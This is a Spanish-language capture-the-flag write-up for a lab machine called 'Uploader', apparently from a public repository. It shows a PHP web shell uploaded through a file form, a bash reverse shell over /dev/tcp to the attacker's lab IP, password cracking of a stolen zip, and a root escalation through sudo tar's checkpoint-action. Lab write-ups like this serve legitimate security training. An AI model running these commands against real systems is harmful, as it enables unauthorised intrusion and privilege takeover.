
# 🚩 Resolución del CTF: **Uploader**
*Write-up detallado del desafío de pentesting*

---

## 📌 **Descripción General**
Este CTF simula un escenario de **inyección de archivos** y **escalada de privilegios** en un servidor web Apache. La explotación se centra en una vulnerabilidad de **Remote Code Execution (RCE)** a través de un formulario de subida de archivos mal configurado, seguido de técnicas de **enumeración** y **abuso de permisos** (`sudo`).

---

## 🎯 **Objetivo del CTF**
- **Acceso inicial**: Ganar una shell en el servidor como `www-data`.
- **Escalada de privilegios**: Obtener acceso como `root` explotando permisos `sudo` con `tar`.

---

## 🔍 **Fase de Reconocimiento**

### 🌐 **Dirección IP del Objetivo**
```bash
192.168.100.25
```

### 🔧 **Verificación de Conectividad**
```bash
ping -c 1 192.168.100.25
```
- **Resultado**: Respuesta ICMP exitosa (TTL = 64 → **Sistema Linux**).

---

## 🛠️ **Herramientas y Comandos Utilizados**

### 🔎 **Escaneo de Red y Puertos**
```bash
# Escaneo rápido de la red local (interfaz eth1)
sudo arp-scan --localnet -I eth1

# Escaneo de puertos con Nmap (rápido y agresivo)
nmap -n -Pn --open --min-rate 5000 -p- 192.168.100.25

# Escaneo de servicios en el puerto 80
nmap -n -Pn -p80 -sCV 192.168.100.25
```
- **Resultado**:
  ```
  80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNobe))
  ```

---

### 🌐 **Análisis del Servicio Web**
```bash
# Detección de tecnologías (WhatWeb)
whatweb http://192.168.100.25

# Escaneo de directorios con Gobuster
gobuster dir -u http://192.168.100.25 \
  -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -t 50 -x php,html,txt,sh,js
```
- **Hallazgos**:
  ```
  /index.html           (Status: 200) [Size: 3968]
  /uploads              (Status: 301) [Size: 318] → http://192.168.100.25/uploads/
  /upload.php           (Status: 200) [Size: 3277]
  ```

---

## 💥 **Explotación de Vulnerabilidades**

### 📂 **Vector de Ataque: Subida de Archivos Maliciosos**
1. **Creación de la shell PHP**:
   ```php
   <?php system($_GET["cmd"]); ?>
   ```
   - Guardado como `shell.php`.

2. **Subida del archivo**:
   - Ruta de subida: `http://192.168.100.25/upload.php`.
   - Confirmación exitosa: `http://192.168.100.25/uploads/cloud_9d0c2f/shell.php`.

3. **Ejecución de comandos (RCE)**:
   ```bash
   http://192.168.100.25/uploads/cloud_9d0c2f/shell.php?cmd=whoami
   ```
   - **Resultado**: `www-data`.

---

### 🐍 **Obtención de Acceso Inicial (Reverse Shell)**
```bash
# Escucha en el puerto 443 (Netcat)
nc -nlvp 443

# Ejecución de la reverse shell desde la web
http://192.168.100.25/uploads/cloud_9d0c2f/shell.php?cmd=bash -c 'exec bash -i &>/dev/tcp/192.168.100.26/443 <&1'
```

---

## 🔐 **Escalada de Privilegios**

### 👤 **Enumeración de Usuarios**
```bash
cat /etc/passwd | grep "sh"
```
- **Usuarios relevantes**:
  ```
  root:x:0:0:root:/root:/bin/bash
  operatorx:x:1000:1000:operator:/home/operatorx:/bin/bash
  ```

### 📂 **Búsqueda de Archivos Sensibles**
```bash
# Lectura del archivo Readme.txt (pista)
cat /home/Readme.txt
# Salida: "He guardado mi archivo zip más importante en un lugar secreto."

# Búsqueda de archivos ZIP con permisos de root
find / -type f -name "*.zip" -user root -ls 2>/dev/null
```
- **Resultado**: `/srv/secret/File.zip`.

---

### 🔓 **Extracción de Credenciales (File.zip)**
1. **Transferencia del archivo**:
   ```bash
   # En la máquina víctima (Python HTTP Server)
   python3 -m http.server 8080

   # En la máquina atacante
   wget http://192.168.100.25:8080/File.zip
   ```

2. **Crackeo de contraseña con John the Ripper**:
   ```bash
   zip2john File.zip > hash
   john --wordlist=/usr/share/wordlists/rockyou.txt hash
   ```
   - **Contraseña encontrada**: `121288`.

3. **Descompresión y lectura**:
   ```bash
   7z x File.zip
   cat File.zip/Credentials/Credentials.txt
   ```
   - **Credenciales**:
     ```
     User: operatorx
     Password: d0970714757783e6cf17b26fb8e2298f (hash MD5)
     Hash descifrado: 112233
     ```

4. **Migración a usuario `operatorx`**:
   ```bash
   su operatorx
   Password: 112233
   ```

---

### 🚀 **Obtención de la Flag de Usuario**
```bash
cat /home/operatorx/user.txt
```

### 🔓 **Abuso de Permisos `sudo`**
```bash
sudo -l
```
- **Resultado**:
  ```
  User operatorx may run the following commands on TheHackersLabs-Operator:
      (ALL) NOPASSWD: /usr/bin/tar
  ```

### 🎯 **Escalada a Root con `tar`**
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
- **Resultado**: Shell como `root`.

---

## 📜 **Evidencia de Compromiso**
```bash
# Lectura de la flag de root
cat /root/root.txt
```

---

## 📊 **Resumen de Comandos Clave**
| Fase               | Comando                                                                 |
|--------------------|-------------------------------------------------------------------------|
| **Reconocimiento** | `ping`, `nmap`, `whatweb`, `gobuster`                                  |
| **Explotación**    | `shell.php`, `nc -nlvp 443`, `bash -i &>/dev/tcp/...`                   |
| **Escalada**       | `find / -name "*.zip"`, `zip2john`, `sudo tar --checkpoint-action=exec` |


*Flags obtenidas: `user.txt` y `root.txt`.*

<img width="1323" height="730" alt="image" src="https://github.com/user-attachments/assets/0c03b036-ae8b-48c9-87c2-5c424796452a" />

